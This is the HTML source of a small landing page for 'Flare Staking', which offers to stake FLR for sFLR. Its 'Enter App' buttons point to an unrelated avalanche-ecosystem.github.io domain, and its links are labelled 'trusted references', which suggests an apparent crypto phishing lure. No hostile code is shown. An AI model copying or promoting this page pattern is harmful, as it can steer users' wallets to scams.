<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Flare Staking</title>
  <meta name="description" content="Flare Staking lets you stake FLR and receive a liquid staking token from your own wallet.">
  <link rel="canonical" href="https://flare-staking.github.io/">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta name="theme-color" content="#F7F5F3">
  <meta property="og:type" content="website">
  <meta property="og:title" content="Flare Staking">
  <meta property="og:description" content="Flare Staking lets you stake FLR and receive a liquid staking token from your own wallet.">
  <meta property="og:url" content="https://flare-staking.github.io/">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Flare Staking">
  <meta name="twitter:description" content="Flare Staking lets you stake FLR and receive a liquid staking token from your own wallet.">
  <link rel="icon" type="image/png" href="favicon.png">
  <link rel="apple-touch-icon" href="favicon.png">
  <link rel="manifest" href="site.webmanifest">
  <link rel="stylesheet" href="style.css">
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "WebSite",
        "@id": "https://flare-staking.github.io/#website",
        "url": "https://flare-staking.github.io/",
        "name": "Flare Staking",
        "inLanguage": "en"
      },
      {
        "@type": "WebApplication",
        "@id": "https://flare-staking.github.io/#app",
        "name": "Flare Staking",
        "applicationCategory": "FinanceApplication",
        "operatingSystem": "Web",
        "url": "https://flare-staking.github.io/"
      },
      {
        "@type": "Organization",
        "@id": "https://flare-staking.github.io/#organization",
        "name": "Flare Staking",
        "url": "https://flare-staking.github.io/"
      }
    ]
  }
  </script>
</head>
<body>
  <header class="topbar">
    <a class="brand" href="#" aria-label="Flare Staking">
      <img src="favicon.png" width="30" height="30" alt="">
      <span>Flare Staking</span>
    </a>
    <nav class="nav" aria-label="Trusted references">
      <a href="https://flarescan.com/" target="_blank" rel="nofollow noopener noreferrer">Flarescan</a>
      <a href="https://flare.network/" target="_blank" rel="nofollow noopener noreferrer">Flare Network</a>
      <a href="https://www.coingecko.com/en/coins/flare" target="_blank" rel="nofollow noopener noreferrer">CoinGecko</a>
    </nav>
    <span class="spacer"></span>
    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
  </header>

  <main class="stage">
    <section class="hero" aria-label="Flare Staking">
      <h1>Flare Staking</h1>
      <p class="sub"><strong>Flare Staking</strong> lets you stake FLR and receive a liquid staking token from your own wallet.</p>
    </section>

    <section class="card" aria-label="Staking preview">
      <div class="route">
        <div class="leg">
          <span class="lbl">Stake</span>
          <span class="chip">
            <img class="ic" src="flr.png" width="28" height="28" alt="FLR">
            <span class="asset">FLR</span>
          </span>
        </div>
        <button class="switch" type="button" data-switch aria-label="Switch stake and receive assets">
          <span aria-hidden="true">&rarr;</span>
        </button>
        <div class="leg">
          <span class="lbl">Receive</span>
          <span class="chip">
            <img class="ic" src="flr.png" width="28" height="28" alt="sFLR">
            <span class="asset">sFLR</span>
          </span>
        </div>
      </div>
      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&rsaquo;</span></a>
    </section>
  </main>

  <footer class="foot">
    <b>Flare Staking</b> &mdash; 2026
  </footer>

  <script>
  (function(){
    "use strict";
    var button = document.querySelector("[data-switch]");
    if (!button) return;
    button.addEventListener("click", function(){
      var chips = document.querySelectorAll(".leg .chip");
      if (chips.length < 2) return;
      var first = chips[0].innerHTML;
      chips[0].innerHTML = chips[1].innerHTML;
      chips[1].innerHTML = first;
      button.classList.toggle("is-swapped");
    });
  })();
  </script>
</body>
</html>
